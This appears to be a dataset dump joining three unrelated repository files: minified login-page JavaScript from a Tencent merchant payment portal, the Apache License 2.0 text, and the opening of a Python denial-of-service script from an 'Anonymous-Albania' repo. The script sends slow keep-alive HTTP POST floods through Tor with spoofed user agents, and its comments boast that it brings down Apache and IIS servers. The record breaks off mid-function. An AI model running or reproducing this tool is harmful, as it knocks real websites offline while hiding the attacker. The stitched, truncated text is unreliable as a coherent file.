Date(),expires=arguments[2]||null,path=arguments[3]||""/"",domain=arguments[4]||null,secure=arguments[5]||false;expires?exp.setMinutes(exp.getMinutes()+parseInt(expires)):"""";document.cookie=name+\'=\'+escape(value)+(expires?\';expires=\'+exp.toGMTString():\'\')+(path?\';path=\'+path:\'\')+(domain?\';domain=\'+domain:\'\')+(secure?\';secure\':\'\');};function $strTrim(str,code){var argus=code||""\\\\s"";var temp=new RegExp(""(^""+argus+""*)|(""+argus+""*$)"",""g"");return str.replace(temp,"""");};function $time33(str){for(var i=0,len=str.length,hash=5381;i<len;++i){hash+=(hash<<5)+str.charAt(i).charCodeAt();};return hash&0x7fffffff;};function $xhrMaker(){var xhr;try{xhr=new XMLHttpRequest();}catch(e){try{xhr=new ActiveXObject(""Msxml2.XMLHTTP"");}catch(e){try{xhr=new ActiveXObject(""Microsoft.XMLHTTP"");}catch(e){xhr=null;}}};return xhr;};$namespace(""MCH.home"");MCH.home={tenpayEdit:\'\;MCH.home.init=function(){homeThat=this;homeThat.tenpayEdit=new MCH.mmpayEdit({bindObjId:""mmpayPwdEdit"",width:258,height:44},{isShowFunc:MCH.home.isShowFunc,returnCallBack:MCH.home.editShowReturn},this);this.bind();Common.exdAttrBrowser();};MCH.home.isShowFunc=function(){var username=$strTrim($("".login-form"").find(""input[name=username]"").val());if(Common.isTenpayMchByName(username)){return true;}else{return false;}};MCH.home.editShowReturn=function(editRet){var browserFunc=function(){var sys=Common.getBrowserVersion();if(sys.osType==""mac""&&sys.browserName==""Safari""){$(""#IDBrowserSafariTips"").removeClass(""hide"");}else if(sys.osType==""mac""&&sys.browserName==""Chrome""&&sys.browserVersion>=""47""){$(""#IDBrowserMacChromeTips"").removeClass(""hide"");}else if(sys.osType==""windows""&&sys.browserName!=""IE""){$(""#IDBrowserMacChromeTips"").removeClass(""hide"");}};try{var version=editRet.editObj.ctrl.Version.toString();if(version&&(version>1206)){return true;}else{browserFunc();}}catch(e){browserFunc();}};MCH.home.focus_fuc=function(){$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");};MCH.home.blur_fuc=function(){$("".login-form"").removeClass(""login-password-on"");};MCH.home.enter_fuc=function(){return null;};MCH.home.ossAttrIncAPI=function(id,key){var postData=\'id=\'+id+\'&key=\'+key;$ajax({url:\'/webreport/ossattrapi\',data:postData,method:\'post\',type:\'json\',async:true,onSuccess:function(data){},onError:function(msg){}});};MCH.home.userNameBlur=function(){var username=$("".login-form"").find(""input[name=username]"").val();var length=username.length;switch(length){case 0:MCH.home.ossAttrIncAPI(63769,18);break;case 1:MCH.home.ossAttrIncAPI(63769,19);break;case 2:MCH.home.ossAttrIncAPI(63769,20);break;case 3:MCH.home.ossAttrIncAPI(63769,21);break;case 4:MCH.home.ossAttrIncAPI(63769,22);break;case 5:MCH.home.ossAttrIncAPI(63769,23);break;case 6:MCH.home.ossAttrIncAPI(63769,24);break;case 7:MCH.home.ossAttrIncAPI(63769,25);break;case 8:MCH.home.ossAttrIncAPI(63769,26);break;case 9:MCH.home.ossAttrIncAPI(63769,27);break;case 10:MCH.home.ossAttrIncAPI(63769,28);break;default:MCH.home.ossAttrIncAPI(63769,29);break;}         var ua=navigator.userAgent.toLowerCase();var reg=/[Aa]ndroid/;if(reg.test(ua)){MCH.home.ossAttrIncAPI(63769,31);}else{MCH.home.ossAttrIncAPI(63769,32);}};MCH.home.bind=function(){$(""input[name=username]"").focus();if($getCookie(""username"")){MCH.home.ossAttrIncAPI(63769,30);$(""input[name=username]"").val($getCookie(""username""));$(""#memory_username"").addClass(\'cbx-on\');}         $(""input[name=username]"").on(\'focus\',function(){MCH.home.ossAttrIncAPI(63769,17);$("".login-form"").removeClass(""login-password-on"");$("".login-form"").addClass(""login-account-on"");});$(""input[name=password]"").on(\'focus\',function(){$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");homeThat.tenpayEdit.show();});$(""input[name=username]"").on(\'blur\',function(){MCH.home.userNameBlur();$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");homeThat.tenpayEdit.show();});$(""#memory_username_label"").on(\'click\',function(){if($(\'#memory_username\').hasClass(\'cbx-on\')){$(\'#memory_username\').removeClass(\'cbx-on\');}else{$(\'#memory_username\').addClass(\'cbx-on\');}});$(""#do_login"").on(\'click\',function(){$(""#errmsg"").text("""").addClass(\'hide\');var temp_usrname=$("".login-form"").find(""input[name=username]"").val();$("".login-form"").find(""input[name=username]"").val($strTrim(temp_usrname));if($(""#memory_username"").hasClass(\'cbx-on\')){$setCookie(\'username\',$(""input[name=username]"").val(),\'3600\');}else{$setCookie(\'username\',$(""input[name=username]"").val());}             var username=$("".login-form"").find(""input[name=username]"").val();var password=$("".login-form"").find(""input[name=password]"").val();password=homeThat.tenpayEdit.getPwd();if(username&&password){password=Common.encryptPassword(password);if($("".login-verify"").html()){if($(""input[name=checkword_in]"").val()){if($(""input[name=checkword_in]"").val().length!=4){$(""#errmsg"").text(\'ËØ∑Ê£ÄÊü•È™åËØÅÁ†Å\').removeClass(\'hide\');}else{$("".login-form"").find(""input[name=password]"").val(password);$("".login-form"").submit();}}             else{$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•È™åËØÅÁ†Å\').removeClass(\'hide\');}}else{$("".login-form"").find(""input[name=password]"").val(password);$("".login-form"").submit();}}else{if(username.length==0&&password===false){$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•Â∏êÂè∑ÂíåÂØÜÁ†Å\').removeClass(\'hide\');}else if(username.length==0){$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•ÁôªÂΩïÂ∏êÂè∑\').removeClass(\'hide\');}else{$(""#errmsg"").text(homeThat.tenpayEdit.errmsg).removeClass(\'hide\');}}});};MCH.home.init();     window[\'MCH.home\']=\'22134:20140516:20170105201629\';     window[\'MCH.home.time\'] && window[\'MCH.home.time\'].push(new Date()); </script><!--[if !IE]>|xGv00|6f5e5c77fe153f6e42ad173204c021c5<![endif]--> <script>window[""MCH.cms.time""]=[new Date()]</script> <script id=""legos:22392"" ver=""22392:20151027:20160810123858"" name=""MCH.cms"" src=""https://wx.gtimg.com/mch/js/ver/2015/10/mch.cms.20151027.js?t=20160810123858"" charset=""utf-8""></script><!--[if !IE]>|xGv00|b299de016a6e1f795625ccbc51c6c029<![endif]-->  <!-- Â∫ïÈÉ®[[ --> <div class=""footer"">     <div class=""wrap"">         <p>             <a target=""_blank"" href=""http://help.tenpay.com/cgi-bin/helpcenter/help_center.cgi?id=1&amp;type=0"">ÂÖ≥‰∫éË¥¢‰ªòÈÄö</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://pay.weixin.qq.com/index.php/core/home/pay_pact_v4"">Âπ≥Âè∞‰ΩøÁî®ÂçèËÆÆ</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/index.php/public/apply_sign/protocol_v2"" target=""_blank"">ÊîØ‰ªòÊúçÂä°ÂçèËÆÆ</a>             <i class=""vs"">|</i>             Powered By Tencent &amp; Tenpay\u3000Copyright¬© 2005-<script>             var year="""";             mydate=new Date();             myyear=mydate.getYear();             year=(myyear > 200) ? myyear : 1900 + myyear;             document.write(year);         </script>2017 Tenpay All Rights Reserved.         </p>         <p>             <a target=""_blank"" href=""http://weixin.qq.com/"">ÂæÆ‰ø°</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://mp.weixin.qq.com/"">ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://open.weixin.qq.com/"">ÂæÆ‰ø°ÂºÄÊîæÂπ≥Âè∞</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""http://e.qq.com/"">ÂπøÁÇπÈÄö</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""http://open.qq.com/"">ËÖæËÆØÂºÄÊîæÂπ≥Âè∞</a>         </p>     </div> </div> <script type=""text/javascript"">if(typeof $jqueryUi == ""undefined""){document.write(\'<script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+"">\');}</script><script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+""> <script>window[""MCH.footer.time""]=[new Date()]</script> <script id=""legos:22125"" ver=""22125:20140422:20161206161027"" name=""MCH.footer"" charset=""utf-8"">     window[\'MCH.footer.time\'] && window[\'MCH.footer.time\'].push(new Date());     function $addToken(url,type,skey){var token=$getToken(skey);if(url==""""||(url.indexOf(""://"")<0?location.href:url).indexOf(""http"")!=0){return url;}         if(url.indexOf(""#"")!=-1){var f1=url.match(/\\?.+\\#/);if(f1){var t=f1[0].split(""#""),newPara=[t[0],""&g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");return url.replace(f1[0],newPara);}else{var t=url.split(""#"");return[t[0],""?g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");}}         return token==""""?(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_ty=""+type):(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_tk=""+token+""&g_ty=""+type);};var $ajax=(function(window,undefined){var oXHRCallbacks,xhrCounter=0;var fXHRAbortOnUnload=window.ActiveXObject?function(){for(var key in oXHRCallbacks){oXHRCallbacks[key](0,1);}}:false;return function(opt){var o={url:\'\',method:\'GET\',data:null,type:""text"",async:true,cache:false,timeout:0,autoToken:true,username:\'\',password:\'\',beforeSend:$empty(),onSuccess:$empty(),onError:$empty(),onComplete:$empty()};for(var key in opt){o[key]=opt[key]}         var callback,timeoutTimer,xhrCallbackHandle,ajaxLocation,ajaxLocParts;try{ajaxLocation=location.href;}         catch(e){ajaxLocation=document.createElement(""a"");ajaxLocation.href="""";ajaxLocation=ajaxLocation.href;}         ajaxLocParts=/^([\\w\\+\\.\\-]+:)(?:\\/\\/([^\\/?#:]*)(?::(\\d+)|)|)/.exec(ajaxLocation.toLowerCase())||[];o.isLocal=/^(?:about|app|app\\-storage|.+\\-extension|file|res|widget):$/.test(ajaxLocParts[1]);o.method=(typeof(o.method)!=""string""||o.method.toUpperCase()!=""POST"")?""GET"":""POST"";o.data=(typeof o.data==""string"")?o.data:$makeUrl(o.data);if(o.method==\'GET\'&&o.data){o.url+=(o.url.indexOf(""?"")<0?""?"":""&"")+o.data;}         if(o.autoToken){o.url=$addToken(o.url,""ajax"");}         o.xhr=$xhrMaker();if(o.xhr===null){return false;}         try{if(o.username){o.xhr.open(o.method,o.url,o.async,o.username,o.password);}         else{o.xhr.open(o.method,o.url,o.async);}}         catch(e){o.onError(-2,e);return false;}         if(o.method==\'POST\'){o.xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');}         if(!o.cache){o.xhr.setRequestHeader(\'If-Modified-Since\',\'Thu, 1 Jan 1970 00:00:00 GMT\');o.xhr.setRequestHeader(\'Cache-Control\',\'no-cache\');}         o.beforeSend(o.xhr);if(o.async&&o.timeout>0){if(o.xhr.timeout===undefined){timeoutTimer=setTimeout(function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');},o.timeout);}         else{o.xhr.timeout=o.timeout;o.xhr.ontimeout=function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');};}}         o.xhr.send(o.method==\'POST\'?o.data:null);callback=function(e,isAbort){if(timeoutTimer){clearTimeout(timeoutTimer);timeoutTimer=undefined;}             if(callback&&(isAbort||o.xhr.readyState===4)){callback=undefined;if(xhrCallbackHandle){o.xhr.onreadystatechange=$empty();if(fXHRAbortOnUnload){try{delete oXHRCallbacks[xhrCallbackHandle];}             catch(e){}}}                 if(isAbort){if(o.xhr.readyState!==4){o.xhr.abort();}}                 else{var status,statusText,responses;responses={headers:o.xhr.getAllResponseHeaders()};status=o.xhr.status;try{statusText=o.xhr.statusText;}                 catch(e){statusText="""";}                     try{responses.text=o.xhr.responseText;}                     catch(e){responses.text="""";}                     if(!status&&o.isLocal){status=responses.text?200:404;}                     else if(status===1223){status=204;}                     if(status>=200&&status<300){responses.text=responses.text.replace(/<!--\\[if !IE\\]>[\\w\\|]+<!\\[endif\\]-->/g,\'\');switch(o.type){case\'text\':o.onSuccess(responses.text);break;case""json"":var json;try{json=(new Function(""return (""+responses.text+"")""))();}                     catch(e){o.onError(status,e,responses.text);}                         if(json){o.onSuccess(json);}                         break;case""xml"":o.onSuccess(o.xhr.responseXML);break;}}                     else{if(status===0&&o.timeout>0){o.onError(status,null,\'timeout\');}                     else{o.onError(status,null,statusText);}}                     o.onComplete(status,statusText,responses);}                 delete o.xhr;}};if(!o.async){callback();}         else if(o.xhr.readyState===4){setTimeout(callback,0);}         else{xhrCallbackHandle=++xhrCounter;if(fXHRAbortOnUnload){if(!oXHRCallbacks){oXHRCallbacks={};if(window.attachEvent){window.attachEvent(""onunload"",fXHRAbortOnUnload);}         else{window[""onunload""]=fXHRAbortOnUnload;}}             oXHRCallbacks[xhrCallbackHandle]=callback;}             o.xhr.onreadystatechange=callback;}};})(window,undefined);function $empty(){return function(){return true;}};function $getCookie(name){var reg=new RegExp(""(^| )""+name+""(?:=([^;]*))?(;|$)""),val=document.cookie.match(reg);return val?(val[2]?unescape(val[2]):""""):null;};function $getToken(skey){var skey=skey?skey:$getCookie(""skey"");return skey?$time33(skey):"""";};function $makeUrl(data){var arr=[];for(var k in data){arr.push(k+""=""+data[k]);};return arr.join(""&"");};function $namespace(name){for(var arr=name.split(\',\'),r=0,len=arr.length;r<len;r++){for(var i=0,k,name=arr[r].split(\'.\'),parent={};k=name[i];i++){i===0?eval(\'(typeof \'+k+\')===""undefined""?(\'+k+\'={}):"""";parent=\'+k):(parent=parent[k]=parent[k]||{});}}};function $time33(str){for(var i=0,len=str.length,hash=5381;i<len;++i){hash+=(hash<<5)+str.charAt(i).charCodeAt();};return hash&0x7fffffff;};function $xhrMaker(){var xhr;try{xhr=new XMLHttpRequest();}catch(e){try{xhr=new ActiveXObject(""Msxml2.XMLHTTP"");}catch(e){try{xhr=new ActiveXObject(""Microsoft.XMLHTTP"");}catch(e){xhr=null;}}};return xhr;};$namespace(""MCH.footer"");MCH.footer={searchChildMerchantTimer:\'\',searchChildMerchantName:\'\',protocolDG:\'\',protocolCbx:\'\',protocolBtn:\'\;MCH.footer.init=function(){footerThat=this;footerThat.bind();footerThat.changeVerify();MCH.footer.protocolDG=Common.getPop(\'MchProtocolDG\');MCH.footer.protocolBtn=$(\'#MchProtocolBn\');MCH.footer.protocolCbx=Common.getCbx({id:\'MchProtocolCbx\',onCheck:function(){MCH.footer.protocolBtn.removeClass(\'btn-default\').addClass(\'btn-primary\');},onUnCheck:function(){MCH.footer.protocolBtn.removeClass(\'btn-primary\').addClass(\'btn-default\');}});MCH.footer.checkSignProtocol();};MCH.footer.bind=function(){footerThat.bindChangeCheckimg();footerThat.bindDatepicker();MCH.header.bindCloseDialog();footerThat.bindSelect();$(\'#MchProtocolBn\').on(\'click\',function(){if(MCH.footer.protocolCbx.isCheck()){var postData=Common.getCrsfToken();var ret=false;$ajax({url:\'/index.php/core/merchant/sign_mch_protocol\',data:postData,method:\'post\',type:\'json\',async:false,onSuccess:function(data){MCH.header.handleAjax(data);if(data.errorcode!=0){ret=false;}else{ret=true;}},onError:function(msg){ret=false;}});if(!ret){MCH.header.showErrorAlertDialog(\'Êìç‰ΩúÂ§±Ë¥•,ËØ∑Á®çÂêéÈáçËØï\');}else{MCH.footer.protocolDG.close();}}});};MCH.footer.changeVerify=function(){if($("".img-verify"").size()>0){$("".img-verify"").attr(""src"",""http://captcha.qq.com/getimage?aid=755049101&rd=""+Math.random());}};MCH.footer.bindChangeCheckimg=function(){$("".change-verify"").on(\'click\',function(){footerThat.changeVerify();});$("".checkimg-input"").on(\'keydown\',function(){var value=$(this).val();result=false;if(value.length==4){var token_name=$(""#token"").attr(""name"");var hash=$(""#token"").val();var post_data=token_name+\'=\'+hash+\'&verify_word=\'+value;$ajax({url:\'/index.php/core/home/vaild_checkimg\',data:post_data,method:\'post\',type:\'json\',async:false,onSuccess:function(data){if(data.errorcode==0){result=true;}else{}},onError:function(msg){result=false;}});}});};MCH.footer.bindDatepicker=function(timepicker){if($("".datepicker-input"").size()<=0){return false;}         false?$jqueryUi():\'\';timepicker=timepicker?true:false;var format=\'Y-m-d\';if(timepicker){format=\'Y-m-d H:i\';}         $(\'.datepicker-input\').datetimepicker({defaultTime:\'00:00:00\',step:1,format:format,lang:\'ch\',timepicker:timepicker,yearStart:1970,closeOnDateSelect:true});$(""input.datepicker-input"").next(""i.ico-date"").on(\'click\',function(){$(this).prev(\'input.datepicker-input\').focus();});};MCH.footer.bindSelect=function(){$(""div.dropdown-menu"").on(\'click\',function(){$(this).addClass(\'open\');});$(""ul.dropdown-list"").on(\'click\',\'li\',function(){var value=$(this).children(""a"").attr(\'data-target\');var text=$(this).children(""a"").text();var drop_switch=$(this).parent().prev(""a.dropdown-switch"");drop_switch.attr(\'data-target\',value);drop_switch.children(\'label\').text(text);var id=drop_switch.children(\'label\').attr(\'id\');var name=drop_switch.children(\'label\').html();$(this).parent().parent().removeClass(\'open\');typeof SelectCallBack==\'function\'&&SelectCallBack(id,name);return false;});$(""div.dropdown-menu"").mouseleave(function(){if($(this).hasClass(\'open\')){$(this).removeClass(\'open\');}});};MCH.footer.searchChildMerchant=function(params){var obj=params[\'obj\'];var value=obj.val();if(value!=MCH.footer.searchChildMerchantName){return false;}         var merchants={};var curpage=params[\'curpage\'];var total_page=1;var isAppend=params[\'isAppend\'];var list=obj.parent().parent().children(\'ul.dropdown-list\');if(!isAppend){list.children().remove();}         var token_name=$(""#token"").attr(""name"");var hash=$(""#token"").val();var post_data=token_name+\'=\'+hash+\'&merchant_name=\'+value+\'&page_num=\'+curpage;$ajax({url:\'/index.php/extend/child_merchant/query_merchant_by_name\',data:post_data,method:\'post\',type:\'json\',async:true,onSuccess:function(data){if(data.errorcode==0){merchants=data.data.list;curpage=data.data.curpage;total_page=data.data.total_page;for(var key in merchants){var model=\'<li><a href=""#"" data-target=""\'+key+\'"">\'+merchants[key]+\'</a></li>\';list.append(model);}             if(curpage<total_page){var nextPage=parseInt(curpage,10)+1;var model=\'<dl class=""jsDropDownLiMerchantMore""><a href=""#"" data-target=""\'+nextPage+\'"">Ëé∑ÂèñÊõ¥Â§öÂ≠êÂïÜÊà∑</a></dl>\';list.append(model);}}},onError:function(msg){}});};MCH.footer.checkSignProtocol=function(){var whiteUrl=[\'/index.php/core/home\',\'/index.php/core/apply_progress\',\'/index.php/core/apply_bank\',\'/index.php/core/apply_sign\',\'/index.php/core/merchantupgrading\',\'/index.php/core/submerchant/create_sub_merchant\',\'/index.php/public/cms\'];var localtion=window.location.pathname;prefix=\'/index.php\';if(localtion.substr(0,prefix.length)!=prefix){localtion=prefix+localtion;}         for(var i=0;i<whiteUrl.length;i++){if(localtion.substr(0,whiteUrl[i].length)==whiteUrl[i]){return;}}         var postData=Common.getCrsfToken();$ajax({url:\'/index.php/public/merchant/check_sign_protocol\',data:postData,method:\'post\',type:\'json\',async:true,onSuccess:function(data){MCH.header.handleAjax(data);if(data.errorcode!=0){MCH.footer.protocolDG.open();}},onError:function(msg){}});};MCH.footer.init();     window[\'MCH.footer\']=\'22125:20140422:20161206161027\';     window[\'MCH.footer.time\'] && window[\'MCH.footer.time\'].push(new Date()); </script><!--[if !IE]>|xGv00|f223e6d2e6d5217ac8b233a5d7602c18<![endif]--> <script>TA_STATS_ARGS={}</script> <script type=""text/javascript"" src=""https://tajs.qq.com/res/js/wechatpay.min.js"" charset=""UTF‚àí8""></script> <!-- <script type=""text/javascript"" src=""https://res.wx.qq.com/payactres/zh_CN/htmledition/js/lib/analysis/2.0/lib-min.js"" charset=""UTF‚àí8"" async=""async"" defer=""defer""></script> --> <!--[if !IE]>|xGv00|f5ede3a717a9f61ace3f2ab9101502d0<![endif]--> <!-- Â∫ïÈÉ® ]] --> <script language=""javascript"" src=""https://pingjs.qq.com/tcss.ping.https.js""></script> <script language=""javascript"">     if(typeof(pgvMain) == \'function\')         pgvMain(); </script>   <!--[if !IE]>|xGv00|d554775be84487e94ed910def6bb127d<![endif]--></body></html>",,2
0,https://github.com/admin1i/https---apps.facebook.com-artexas--by_.git,"       Apache License                            Version 2.0, January 2004                         http://www.apache.org/licenses/     TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION     1. Definitions.        ""License"" shall mean the terms and conditions for use, reproduction,       and distribution as defined by Sections 1 through 9 of this document.        ""Licensor"" shall mean the copyright owner or entity authorized by       the copyright owner that is granting the License.        ""Legal Entity"" shall mean the union of the acting entity and all       other entities that control, are controlled by, or are under common       control with that entity. For the purposes of this definition,       ""control"" means (i) the power, direct or indirect, to cause the       direction or management of such entity, whether by contract or       otherwise, or (ii) ownership of fifty percent (50%) or more of the       outstanding shares, or (iii) beneficial ownership of such entity.        ""You"" (or ""Your"") shall mean an individual or Legal Entity       exercising permissions granted by this License.        ""Source"" form shall mean the preferred form for making modifications,       including but not limited to software source code, documentation       source, and configuration files.        ""Object"" form shall mean any form resulting from mechanical       transformation or translation of a Source form, including but       not limited to compiled object code, generated documentation,       and conversions to other media types.        ""Work"" shall mean the work of authorship, whether in Source or       Object form, made available under the License, as indicated by a       copyright notice that is included in or attached to the work       (an example is provided in the Appendix below).        ""Derivative Works"" shall mean any work, whether in Source or Object       form, that is based on (or derived from) the Work and for which the       editorial revisions, annotations, elaborations, or other modifications       represent, as a whole, an original work of authorship. For the purposes       of this License, Derivative Works shall not include works that remain       separable from, or merely link (or bind by name) to the interfaces of,       the Work and Derivative Works thereof.        ""Contribution"" shall mean any work of authorship, including       the original version of the Work and any modifications or additions       to that Work or Derivative Works thereof, that is intentionally       submitted to Licensor for inclusion in the Work by the copyright owner       or by an individual or Legal Entity authorized to submit on behalf of       the copyright owner. For the purposes of this definition, ""submitted""       means any form of electronic, verbal, or written communication sent       to the Licensor or its representatives, including but not limited to       communication on electronic mailing lists, source code control systems,       and issue tracking systems that are managed by, or on behalf of, the       Licensor for the purpose of discussing and improving the Work, but       excluding communication that is conspicuously marked or otherwise       designated in writing by the copyright owner as ""Not a Contribution.""        ""Contributor"" shall mean Licensor and any individual or Legal Entity       on behalf of whom a Contribution has been received by Licensor and       subsequently incorporated within the Work.     2. Grant of Copyright License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       copyright license to reproduce, prepare Derivative Works of,       publicly display, publicly perform, sublicense, and distribute the       Work and such Derivative Works in Source or Object form.     3. Grant of Patent License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       (except as stated in this section) patent license to make, have made,       use, offer to sell, sell, import, and otherwise transfer the Work,       where such license applies only to those patent claims licensable       by such Contributor that are necessarily infringed by their       Contribution(s) alone or by combination of their Contribution(s)       with the Work to which such Contribution(s) was submitted. If You       institute patent litigation against any entity (including a       cross-claim or counterclaim in a lawsuit) alleging that the Work       or a Contribution incorporated within the Work constitutes direct       or contributory patent infringement, then any patent licenses       granted to You under this License for that Work shall terminate       as of the date such litigation is filed.     4. Redistribution. You may reproduce and distribute copies of the       Work or Derivative Works thereof in any medium, with or without       modifications, and in Source or Object form, provided that You       meet the following conditions:        (a) You must give any other recipients of the Work or           Derivative Works a copy of this License; and        (b) You must cause any modified files to carry prominent notices           stating that You changed the files; and        (c) You must retain, in the Source form of any Derivative Works           that You distribute, all copyright, patent, trademark, and           attribution notices from the Source form of the Work,           excluding those notices that do not pertain to any part of           the Derivative Works; and        (d) If the Work includes a ""NOTICE"" text file as part of its           distribution, then any Derivative Works that You distribute must           include a readable copy of the attribution notices contained           within such NOTICE file, excluding those notices that do not           pertain to any part of the Derivative Works, in at least one           of the following places: within a NOTICE text file distributed           as part of the Derivative Works; within the Source form or           documentation, if provided along with the Derivative Works; or,           within a display generated by the Derivative Works, if and           wherever such third-party notices normally appear. The contents           of the NOTICE file are for informational purposes only and           do not modify the License. You may add Your own attribution           notices within Derivative Works that You distribute, alongside           or as an addendum to the NOTICE text from the Work, provided           that such additional attribution notices cannot be construed           as modifying the License.        You may add Your own copyright statement to Your modifications and       may provide additional or different license terms and conditions       for use, reproduction, or distribution of Your modifications, or       for any such Derivative Works as a whole, provided Your use,       reproduction, and distribution of the Work otherwise complies with       the conditions stated in this License.     5. Submission of Contributions. Unless You explicitly state otherwise,       any Contribution intentionally submitted for inclusion in the Work       by You to the Licensor shall be under the terms and conditions of       this License, without any additional terms or conditions.       Notwithstanding the above, nothing herein shall supersede or modify       the terms of any separate license agreement you may have executed       with Licensor regarding such Contributions.     6. Trademarks. This License does not grant permission to use the trade       names, trademarks, service marks, or product names of the Licensor,       except as required for reasonable and customary use in describing the       origin of the Work and reproducing the content of the NOTICE file.     7. Disclaimer of Warranty. Unless required by applicable law or       agreed to in writing, Licensor provides the Work (and each       Contributor provides its Contributions) on an ""AS IS"" BASIS,       WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or       implied, including, without limitation, any warranties or conditions       of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A       PARTICULAR PURPOSE. You are solely responsible for determining the       appropriateness of using or redistributing the Work and assume any       risks associated with Your exercise of permissions under this License.     8. Limitation of Liability. In no event and under no legal theory,       whether in tort (including negligence), contract, or otherwise,       unless required by applicable law (such as deliberate and grossly       negligent acts) or agreed to in writing, shall any Contributor be       liable to You for damages, including any direct, indirect, special,       incidental, or consequential damages of any character arising as a       result of this License or out of the use or inability to use the       Work (including but not limited to damages for loss of goodwill,       work stoppage, computer failure or malfunction, or any and all       other commercial damages or losses), even if such Contributor       has been advised of the possibility of such damages.     9. Accepting Warranty or Additional Liability. While redistributing       the Work or Derivative Works thereof, You may choose to offer,       and charge a fee for, acceptance of support, warranty, indemnity,       or other liability obligations and/or rights consistent with this       License. However, in accepting such obligations, You may act only       on Your own behalf and on Your sole responsibility, not on behalf       of any other Contributor, and only if You agree to indemnify,       defend, and hold each Contributor harmless for any liability       incurred by, or claims asserted against, such Contributor by reason       of your accepting any such warranty or additional liability.     END OF TERMS AND CONDITIONS",,2
0,https://github.com/valmiromeri/Anonymous-Albania.git,"#!/usr/bin/python  # this assumes you have the socks.py (http://phiral.net/socks.py)  # and terminal.py (http://phiral.net/terminal.py) in the # same directory and that you have tor running locally  # on port 9150. run with 128 to 256 threads to be effective. # kills apache 1.X with ~128, apache 2.X / IIS with ~256 # not effective on nginx  import time import sys import random import getopt import socks import string import terminal  from threading import Thread  global stop_now global term  stop_now = False term = terminal.TerminalController()  useragents = [  ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"",  ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"",  ""Googlebot/2.1 (http://www.googlebot.com/bot.html)"",  ""Opera/9.20 (Windows NT 6.0; U; en)"",  ""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"",  ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"",  ""Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0"",  ""Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16"",  ""Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)"", # maybe not  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13""  ""Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"",  ""Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"",  ""Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)"",  ""Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)"",  ""Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"",  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8"",  ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7"",  ""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",  ""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"",  ""YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"" ]   class httpPost(Thread):     def __init__(self, host, port, tor):         Thread.__init__(self)         self.host = host         self.port = port         self.socks = socks.socksocket()         self.tor = tor         self.running = True      def _send_http_post(self, pause=10):         global stop_now          self.socks.send(""POST / HTTP/1.1\\r\\n""                         ""Host: %s\\r\\n""                         ""User-Agent: %s\\r\\n""                         ""Connection: keep-alive\\r\\n""                         ""Keep-Alive: 900\\r\\n""                         ""Content-Length: 10000\\r\\n""                         ""Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n"" %                         (self.host, random.choice(useragents)))          for i in range(0, 9999):             if stop_now:                 self.running = False                 break             p = random.choice(string.letters+string.digits)             print 